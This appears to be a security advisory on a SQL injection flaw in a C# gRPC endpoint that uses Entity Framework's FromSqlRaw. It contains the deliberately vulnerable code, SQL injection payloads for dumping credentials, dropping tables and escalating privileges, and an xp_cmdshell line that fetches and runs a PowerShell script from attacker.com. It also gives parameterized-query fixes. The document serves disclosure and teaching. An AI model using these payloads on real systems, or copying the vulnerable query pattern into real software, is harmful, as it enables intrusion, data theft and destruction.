# SQL Injection in gRPC Endpoint via Direct String Concatenation

# Vulnerability Case
During a routine security assessment of Acme Corp's microservices API, we identified a SQL injection vulnerability within a gRPC endpoint implemented in C# using .NET Core and Entity Framework. The vulnerability was discovered when untrusted input received via a gRPC call was directly concatenated into a raw SQL query without proper sanitization, circumventing the ORM's built-in query parameterization. This insecure practice was uncovered during both automated testing and manual code review sessions, as the endpoint returned anomalous data patterns suggesting tampered query execution.

```csharp
// Vulnerable gRPC service method in a .NET Core application using Entity Framework
public override async Task<GetUserResponse> GetUser(
    GetUserRequest request,
    ServerCallContext context)
{
    // Untrusted user input received from the gRPC request
    string searchInput = request.SearchTerm;

    // Vulnerable pattern: direct string concatenation in a raw SQL query
    var user = await _dbContext.Users
        .FromSqlRaw("SELECT * FROM Users WHERE UserName = '" +
                    searchInput + "'")
        .FirstOrDefaultAsync();

    var response = new GetUserResponse();
    if (user != null)
    {
        response.UserName = user.UserName;
    }
    return response;
}
```

The vulnerability is rooted in allowing untrusted data to be concatenated into a raw SQL statement via Entity Framework's `FromSqlRaw` method, thereby permitting an attacker to inject malicious SQL code. Exploitation could involve crafting specific input values to manipulate the query logic, which may lead to unauthorized data access, data alteration, or even command execution if higher privileges are involved. Such an attack could result in significant business impacts including data breaches, operational downtime, and damage to corporate reputation within a typical enterprise stack that includes SQL Server, .NET Core, Entity Framework, and gRPC.

context: csharp.dotnet-core.sqli.entityframework-taint-grpc.entityframework-taint-grpc Untrusted input might be used to build a database query, which can lead to a SQL injection vulnerability. An attacker can execute malicious SQL statements and gain unauthorized access to sensitive data, modify, delete data, or execute arbitrary system commands. To prevent this vulnerability, use prepared statements that do not concatenate user-controllable strings and use parameterized queries where SQL commands and user data are strictly separated. Also, consider using an object-relational (ORM) framework to operate with safer abstractions.

# Vulnerability Breakdown
This vulnerability involves a classic SQL injection flaw in Acme Corp's microservices API, where untrusted gRPC input is directly concatenated into a raw SQL query without sanitization.

1. **Key vulnerability elements**:
   - Direct string concatenation in `FromSqlRaw` method
   - Bypassing Entity Framework's built-in parameterization
   - Input from gRPC request directly used in SQL query
   - No input validation or sanitization
   - .NET Core and Entity Framework implementation

2. **Potential attack vectors**:
   - Injecting SQL commands through the `searchTerm` parameter
   - Terminating the intended query and appending malicious commands
   - Using UNION statements to extract data from other tables
   - Executing database administrative commands if permissions allow

3. **Severity assessment**:
   - High confidentiality impact due to potential unauthorized data access
   - High integrity impact from possible data modification
   - High availability impact if data deletion is possible
   - Network-accessible attack vector (remotely exploitable)
   - Low complexity to exploit once endpoint is discovered

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A critical SQL injection vulnerability has been discovered in Acme Corp's microservices API, specifically within a gRPC endpoint implemented in C# using .NET Core and Entity Framework. The vulnerability exists because untrusted user input received from gRPC requests is directly concatenated into a raw SQL query without proper sanitization, bypassing the ORM's built-in query parameterization protection.

```csharp
// Vulnerable code
public override async Task<GetUserResponse> GetUser(
    GetUserRequest request,
    ServerCallContext context)
{
    // Untrusted user input received from the gRPC request
    string searchInput = request.SearchTerm;

    // Vulnerable pattern: direct string concatenation in a raw SQL query
    var user = await _dbContext.Users
        .FromSqlRaw("SELECT * FROM Users WHERE UserName = '" +
                    searchInput + "'")
        .FirstOrDefaultAsync();

    var response = new GetUserResponse();
    if (user != null)
    {
        response.UserName = user.UserName;
    }
    return response;
}

```

This vulnerability allows attackers to inject malicious SQL code into the query, potentially leading to unauthorized data access, data modification, or even command execution if higher privileges are involved.

# CVSS
**Score**: 9.8 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \
**Severity**: Critical

The Critical severity rating (9.8) is justified by the following factors:

- **Network attack vector (AV:N)**: The vulnerability is in a gRPC endpoint that's likely remotely accessible over the network, allowing attackers to exploit it without requiring local access to the system.

- **Low attack complexity (AC:L)**: Exploiting SQL injection vulnerabilities is straightforward and doesn't require special access conditions or significant preparation. Standard SQL injection techniques can be applied directly.

- **No privileges required (PR:N)**: The code doesn't show any authentication checks before executing the vulnerable query. Anyone who can send requests to the gRPC endpoint can potentially exploit the vulnerability.

- **No user interaction (UI:N)**: The vulnerability can be exploited automatically without requiring any action from legitimate users or administrators.

- **Unchanged scope (S:U)**: The impact is contained within the security context of the application and its database, not extending to other components.

- **High confidentiality impact (C:H)**: A successful exploit could allow complete access to all data accessible by the application's database user, potentially exposing sensitive user information, business data, or credentials.

- **High integrity impact (I:H)**: SQL injection could enable unauthorized modification of data in the database, potentially compromising business records, user accounts, or application configuration.

- **High availability impact (A:H)**: Depending on database privileges, an attacker could delete data or disrupt database operations, causing denial of service to the application and its users.

The combination of easy remote exploitation with no required privileges and the potential for complete data compromise justifies the Critical severity rating.

# Exploitation Scenarios
**Scenario 1: Data Exfiltration Attack**
An attacker discovers the vulnerable gRPC endpoint through API mapping or documentation. They craft a malicious search term like `' OR 1=1 -- ` and send it in a legitimate-looking request. Instead of returning a single user, the modified query returns all users in the database. For more targeted data theft, the attacker might use a UNION attack like `' UNION SELECT UserName, Password, Email, '' FROM Users -- ` to extract sensitive credential information.

**Scenario 2: Authentication Bypass**
If this endpoint is used as part of an authentication flow, an attacker could bypass authentication checks. By sending a request with the search term `' OR 'x'='x' -- `, the attacker causes the query to ignore the intended UserName comparison and return a valid user record regardless of input. If authorization is based on this lookup, the attacker gains unauthorized access to the application.

**Scenario 3: Data Modification Attack**
Using a technique called "stacked queries" (if the database configuration allows it), an attacker could inject additional SQL statements. A payload like `'; UPDATE Users SET IsAdmin=1 WHERE UserName='attacker'; -- ` would first complete the original query, then execute a second query that promotes the attacker's account to administrator status, providing elevated privileges within the application.

**Scenario 4: Infrastructure Compromise**
In a worst-case scenario involving elevated database permissions, an attacker might execute operating system commands. A payload such as `'; EXEC master..xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/backdoor.ps1\')"'; -- ` could establish a backdoor on the database server, leading to broader infrastructure compromise beyond the application itself.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive customer or business data, potentially violating data protection regulations (GDPR, CCPA, etc.)
- Data breaches requiring disclosure to affected users and regulatory authorities
- Significant reputational damage if breach becomes public
- Financial losses from regulatory fines, customer compensation, and remediation costs
- Potential intellectual property theft if proprietary data is accessible through the database
- Business disruption if data is modified or deleted by attackers
- Erosion of customer trust and potential customer loss
- Legal liability if customer data is exposed or misused

**Technical Impact:**
- Complete compromise of database confidentiality with potential exposure of all accessible data
- Loss of data integrity through unauthorized modifications that might be difficult to detect
- Potential for privilege escalation within the database if admin credentials are accessible
- Service disruption if critical data is corrupted or deleted
- Backdoor creation allowing persistent access even after the original vulnerability is patched
- Extended compromise timeline if the attack goes undetected
- Lateral movement to other systems if the database contains credentials or configuration details
- Complex incident response process to determine the full extent of data access or modification

# Technical Details
The vulnerability stems from insecure coding practices in the gRPC endpoint implementation. Let's examine the technical aspects:

```csharp
// Vulnerable method in a gRPC service
public override async Task<GetUserResponse> GetUser(
    GetUserRequest request,
    ServerCallContext context)
{
    // Untrusted input from gRPC request
    string searchInput = request.SearchTerm;

    // Vulnerable SQL construction: direct string concatenation
    var user = await _dbContext.Users
        .FromSqlRaw("SELECT * FROM Users WHERE UserName = '" +
                    searchInput + "'")
        .FirstOrDefaultAsync();

    var response = new GetUserResponse();
    if (user != null)
    {
        response.UserName = user.UserName;
    }
    return response;
}

```

**Core Vulnerability Analysis:**

1. **Improper Input Handling**: The code takes the `searchTerm` from the gRPC request and uses it directly without any validation or sanitization.

2. **String Concatenation Anti-Pattern**: Instead of using parameterized queries, the code directly concatenates the user input into the SQL string. This is a well-known anti-pattern in database access code.

3. **Bypassing ORM Protection**: Entity Framework ordinarily provides SQL injection protection through parameterized queries, but this is bypassed by using the `FromSqlRaw` method with string concatenation.

4. **Exploitation Mechanics**: When an attacker provides special SQL characters like quotes, semicolons, or comment markers, they can alter the query's logic or structure, causing it to behave differently than intended.

**Example Attack Vectors:**

1. **Basic Injection**: Input `' OR 1=1 -- `
   - Resulting SQL: `SELECT * FROM Users WHERE UserName = '' OR 1=1 -- '`
   - Effect: Returns all users instead of a specific one

2. **UNION Attack**: Input `' UNION SELECT 1,2,3,4,5,Username,Password FROM Users -- `
   - Resulting SQL: `SELECT * FROM Users WHERE UserName = '' UNION SELECT 1,2,3,4,5,Username,Password FROM Users -- '`
   - Effect: Reveals all usernames and passwords

3. **Stacked Queries**: Input `'; DROP TABLE Users; -- `
   - Resulting SQL: `SELECT * FROM Users WHERE UserName = ''; DROP TABLE Users; -- '`
   - Effect: Deletes the entire Users table

**Technical Context:**

- **Environment**: .NET Core application using Entity Framework and gRPC
- **Data Flow**: gRPC request → Service method → Raw SQL query → Database
- **Affected Components**: The user lookup functionality and any dependent authentication/authorization processes
- **Database Exposure**: The query has access to whatever tables and operations the application's database user is authorized for

# Remediation Steps
## Use Parameterized Queries

**Priority**: P0

Replace string concatenation with parameterized queries to properly separate SQL code from data:

```csharp
public override async Task<GetUserResponse> GetUser(
    GetUserRequest request,
    ServerCallContext context)
{
    string searchInput = request.SearchTerm;
    
    // Parameterized query using SqlParameter to prevent SQL injection
    var userNameParam = new SqlParameter("@userName", searchInput);
    var user = await _dbContext.Users
        .FromSqlRaw("SELECT * FROM Users WHERE UserName = @userName", userNameParam)
        .FirstOrDefaultAsync();
    
    var response = new GetUserResponse();
    if (user != null)
    {
        response.UserName = user.UserName;
    }
    return response;
}

```

Alternatively, use Entity Framework's LINQ query API, which automatically parameterizes:

```csharp
public override async Task<GetUserResponse> GetUser(
    GetUserRequest request,
    ServerCallContext context)
{
    string searchInput = request.SearchTerm;
    
    // Use EF Core's LINQ API which automatically parameterizes
    var user = await _dbContext.Users
        .Where(u => u.UserName == searchInput)
        .FirstOrDefaultAsync();
    
    var response = new GetUserResponse();
    if (user != null)
    {
        response.UserName = user.UserName;
    }
    return response;
}

```

This approach ensures that input values are properly escaped and treated as data rather than executable code, preventing SQL injection attacks.
## Implement Input Validation

**Priority**: P1

Add input validation to ensure that values conform to expected patterns before using them in database operations:

```csharp
public override async Task<GetUserResponse> GetUser(
    GetUserRequest request,
    ServerCallContext context)
{
    string searchInput = request.SearchTerm;
    
    // Input validation
    if (string.IsNullOrEmpty(searchInput))
    {
        throw new RpcException(new Status(StatusCode.InvalidArgument, "Search term cannot be empty"));
    }
    
    // Additional validation - for example, using a regex pattern for valid usernames
    if (!Regex.IsMatch(searchInput, @"^[a-zA-Z0-9_]{3,50}$"))
    {
        throw new RpcException(new Status(StatusCode.InvalidArgument, "Invalid username format"));
    }
    
    // Use EF Core's LINQ API (already parameterized)
    var user = await _dbContext.Users
        .Where(u => u.UserName == searchInput)
        .FirstOrDefaultAsync();
    
    var response = new GetUserResponse();
    if (user != null)
    {
        response.UserName = user.UserName;
    }
    return response;
}

```

Input validation serves as a defense-in-depth measure alongside parameterized queries, ensuring that user input conforms to expected patterns and rejecting potentially malicious inputs before they reach the database layer.


# References
* CWE-89 | [Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-285 | [Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
